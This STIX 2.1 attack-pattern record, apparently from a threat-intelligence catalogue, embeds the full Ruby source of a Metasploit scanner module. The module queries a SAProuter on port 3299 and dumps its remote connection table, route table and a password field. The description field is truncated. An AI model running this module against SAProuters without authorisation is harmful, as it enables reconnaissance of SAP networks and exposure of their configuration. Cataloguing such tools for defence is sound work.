{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--706160e3-fcb4-4718-9a81-d5f936e560a5",
    "created": "2024-08-14T16:27:01.284546Z",
    "modified": "2024-08-14T16:27:01.28455Z",
    "name": "SAPRouter Admin Request",
    "description": " Display the remote connection table from a SAPRouter.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_router_info_request.rb",
            "external_id": "sap_router_info_request.rb"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20130204114105/http://help.sap.com/saphelp_nw70ehp3/helpdata/en/48/6c68b01d5a350ce10000000a42189d/content.htm"
        },
        {
            "source_name": "reference",
            "url": "http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2%20-%20Mariano%20Nunez%20Di%20Croce%20-%20SAProuter%20.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy.\n#\n# The following guys from ERP-SCAN deserve credit for their contributions -\n# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and\n# Dmitry Evdokimov.\n#\n# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis\n# who have Beta tested the modules and provided excellent feedback. Some people\n# just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAPRouter Admin Request',\n      'Description' => %q{\n        Display the remote connection table from a SAPRouter.\n      },\n      'References' => [\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ],\n          [ 'URL', 'https://web.archive.org/web/20130204114105/http://help.sap.com/saphelp_nw70ehp3/helpdata/en/48/6c68b01d5a350ce10000000a42189d/content.htm'],\n          [ 'URL', 'http://conference.hitb.org/hitbsecconf2010ams/materials/D2T2%20-%20Mariano%20Nunez%20Di%20Croce%20-%20SAProuter%20.pdf' ]\n        ],\n      'Author' =>\n        [\n          'Mariano Nunez', # Disclosure about SAPRouter abuses\n          'nmonkee' # Metasploit module\n        ],\n      'License' => BSD_LICENSE\n      )\n    register_options(\n      [\n        Opt::RPORT(3299)\n      ])\n  end\n\n  def get_data(size, packet_len)\n    info = ''\n    1.upto(size) do |i|\n      data = sock.recv(1)\n      packet_len -= 1\n      if data == \"\\x00\"\n        sock.recv(size - i)\n        packet_len -= size - i\n        return info, packet_len\n        break\n      else\n        info << data\n      end\n    end\n  end\n\n  def run_host(ip)\n    host_port = \"#{ip}:#{datastore['RPORT']}\"\n    type = 'ROUTER_ADM'\n    version = 0x26\n    cmd = 0x2\n    count = 0\n    connected = true\n    port = datastore['RPORT']\n    source = ''\n    destination = ''\n    service = ''\n    ni_packet = type + [0,version,cmd,0,0].pack(\"c*\")\n    ni_packet = [ni_packet.length].pack('N') << ni_packet\n    saptbl = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n        'Header' => \"[SAP] SAProuter Connection Table for #{ip}\",\n        'Prefix' => \"\\n\",\n        'Postfix' => \"\\n\",\n        'Indent' => 1,\n        'Columns' =>\n          [\n            \"Source\",\n            \"Destination\",\n            \"Service\"\n          ])\n    begin\n      connect\n    rescue ::Rex::ConnectionRefused\n      print_status(\"#{host_port} - Connection refused\")\n      connected = false\n    rescue ::Rex::ConnectionError, ::IOError, ::Timeout::Error\n      print_status(\"#{host_port} - Connection timeout\")\n      connected = false\n    rescue ::Exception => e\n      print_error(\"#{host_port} - Exception #{e.class} #{e} #{e.backtrace}\")\n      connected = false\n    end\n    if connected\n      print_good(\"#{host_port} - Connected to saprouter\")\n      print_good(\"#{host_port} - Sending ROUTER_ADM packet info request\")\n      sock.put(ni_packet)\n      sock_res = sock.read(4)\n      unless sock_res\n        fail_with(Failure::Unknown, 'Unable to get the packet length')\n      end\n      packet_len = sock_res.unpack('H*')[0].to_i 16\n      print_good(\"#{host_port} - Got INFO response\")\n      while packet_len !=0\n        count += 1\n        case count\n        when 1\n          if packet_len > 150\n            if sock.recv(150)  =~ /access denied/\n              print_error(\"#{host_port} - Access denied\")\n              sock.recv(packet_len)\n              packet_len = sock.recv(4).unpack('H*')[0].to_i 16\n            else\n              packet_len -= 150\n              source, packet_len = get_data(46,packet_len)\n              destination, packet_len = get_data(46,packet_len)\n              service, packet_len = get_data(30,packet_len)\n              sock.recv(2)\n              packet_len -= 2\n              saptbl << [source, destination, service]\n              while packet_len > 0\n                sock.recv(13)\n                packet_len -= 13\n                source, packet_len = get_data(46,packet_len)\n                destination, packet_len = get_data(46,packet_len)\n                service, packet_len = get_data(30,packet_len)\n                term = sock.recv(2)\n                packet_len -= 2\n                saptbl << [source, destination, service]\n              end\n              packet_len = sock.recv(4).unpack('H*')[0].to_i 16\n            end\n          else\n            print_error(\"#{host_port} - No connected clients\")\n            sock.recv(packet_len)\n            packet_len = sock.recv(4).unpack('H*')[0].to_i 16\n          end\n        when 2\n          data = sock.recv(packet_len)\n          packet_len -= packet_len\n          packet_len = sock.recv(4).unpack('H*')[0].to_i 16\n        when 3\n          clients = sock.recv(packet_len)\n          packet_len -= packet_len\n          packet_len = sock.recv(4).unpack('H*')[0].to_i 16\n        when 4\n          pwd = sock.recv(packet_len)\n          print_good(pwd)\n          packet_len -= packet_len\n          packet_len = sock.recv(4).unpack('H*')[0].to_i 16\n        when 5\n          routtab = sock.recv(packet_len)\n          print_good(routtab)\n          packet_len -= packet_len\n          packet_len = sock.recv(4).unpack('H*')[0].to_i 16\n        end\n        if packet_len == 0\n          break\n        end\n      end\n      disconnect\n    # TODO: This data should be saved somewhere. A note on the host would be nice.\n    print_line(saptbl.to_s)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}